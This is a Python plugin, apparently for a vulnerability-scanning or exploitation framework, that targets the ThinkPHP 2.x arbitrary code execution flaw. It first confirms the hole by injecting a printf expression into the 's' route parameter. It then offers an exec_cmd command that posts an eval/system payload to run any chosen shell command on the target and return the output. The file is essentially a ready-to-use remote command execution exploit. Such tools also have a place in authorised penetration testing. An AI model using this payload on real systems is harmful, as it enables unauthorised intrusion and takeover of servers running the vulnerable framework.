# -*-* coding:UTF-8
import re
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "ThinkPHP 2.x 任意代码执行漏洞",
        "description": "ThinkPHP是国内著名的开源的PHP框架",
        "references": ["-"]
    }

    def url(self) -> dict:
        random_int1 = self.build_random_int()
        random_int2 = self.build_random_int()
        random_sum = int(random_int1) * int(random_int2)
        r = self.request(
            method='get',
            path=f'./index.php?s=/index/index/name/$%7B@printf({random_int1}*{random_int2})%7D'
        )
        if str(random_sum) in r.text:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        cmd = f'echo <--- && {cmd} && echo --->'.replace('&', '%26')
        r = self.request(
            method='post',
            path=urllib.parse.urljoin(url, './index.php?s=/index/index/name/$%7B@printf(eval($_POST[1]))%7D'),
            data=f'1=system("{cmd}");',
        )
        if r.status_code == 200:
            match = re.search('<---(.*?)--->', r.text, re.S)
            if match:
                result = match.group(1)
                return result
        else:
            self.log.failure('命令执行失败')
